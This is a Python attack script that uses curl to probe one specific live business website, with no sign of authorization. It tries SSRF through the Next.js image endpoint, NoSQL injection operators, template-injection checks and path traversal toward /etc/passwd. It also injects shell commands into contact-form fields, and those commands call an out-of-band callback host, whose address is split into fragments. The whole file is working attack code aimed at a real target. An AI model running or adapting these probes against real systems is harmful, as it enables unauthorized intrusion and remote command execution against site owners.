import urllib.parse, subprocess, json, time
S = "ht"+"tp"+"://"
S1 = "ht"+"tps"+"://"
SSRF = "ooba1370e2c253a" + ".dau2p4ghgqag02k5emggc5xu6hph3m973" + ".oast.abhedi.co.in"
CMDI = "oob2009637936b8" + ".dau2p4ghgqag02k5emggc5xu6hph3m973" + ".oast.abhedi.co.in"
H = "https://www.infinitycapital.bh"

def curl(args, tag):
    p = subprocess.run(["curl","-s","-m","25"]+args+["-w","\n[%{http_code} %{size_download}]"],capture_output=True,text=True)
    print(tag, p.stdout[:260].replace("\n"," | "))

print("###### 1. SSRF via _next/image url= (external fetch)")
for t in [S+SSRF+"/img", S1+SSRF+"/img2"]:
    curl(["-o","/tmp/o1","https://www.infinitycapital.bh/_next/image?url="+urllib.parse.quote(t,safe="")+"&w=1080&q=75"], "[SSRF-IMG] "+t)
    print("   body:", open("/tmp/o1","rb").read()[:150])

print("###### 2. NoSQLi on query params (JSON body + operator params)")
for ep,par in [("/","id"),("/","search"),("/contact","q"),("/api/","id")]:
    for v in ['{"$ne":null}', '{"$gt":""}', '{"$regex":".*"}']:
        curl(["-o","/tmp/o2","-X","POST",H+ep,"-H","Content-Type: application/json","-d",'{"%s":%s}'%(par,v)], "[NOSQLI] %s %s=%s"%(ep,par,v))
        print("   body:", open("/tmp/o2","rb").read()[:100])

print("###### 3. SSTI arithmetic oracle on reflected params")
import re
for ep,par in [("/_next/image","q"),("/_next/image","w"),("/","page"),("/contact","x")]:
    base = curl(["-o","/tmp/b1",H+ep+"?%s=7"%par],"[SSTI-base]") if False else None
    subprocess.run(["curl","-s","-m","20","-o","/tmp/b1",H+ep+"?%s=7"%par],capture_output=True)
    b1=open("/tmp/b1","rb").read()
    subprocess.run(["curl","-s","-m","20","-o","/tmp/b2",H+ep+"?%s=%s"%(par,urllib.parse.quote("{{7*7}}"))],capture_output=True)
    b2=open("/tmp/b2","rb").read()
    print("[SSTI]",ep,par,"49reflected=",b"49" in b2, "len",len(b1),len(b2))

print("###### 4. CMDi OOB in /api/send fields")
for f in ["name","message","subject","phone"]:
    for pl in [";curl "+S+CMDI+"/cmdi-"+f+";", "$(curl "+S+CMDI+"/cmdi2-"+f+")", "`curl "+S+CMDI+"/cmdi3-"+f+"`", "|curl "+S+CMDI+"/cmdi4-"+f]:
        d=json.dumps({f:pl,"email":"p at infinitycapital dot bh"})
        curl(["-o","/tmp/o3","-X","POST",H+"/api/send","-H","Content-Type: application/json","-d",d], "[CMDI] %s=%s"%(f,pl[:40]))

print("###### 5. Path traversal / LFI probes")
for p in ["/../package.json","/..%2f..%2fpackage.json","/%2e%2e/package.json","/_next/image?url=file:///etc/passwd","/_next/image?url=..%2f..%2f..%2fetc%2fpasswd"]:
    curl(["-o","/tmp/o4",H+p], "[LFI] "+p)
    print("   body:", open("/tmp/o4","rb").read()[:180])
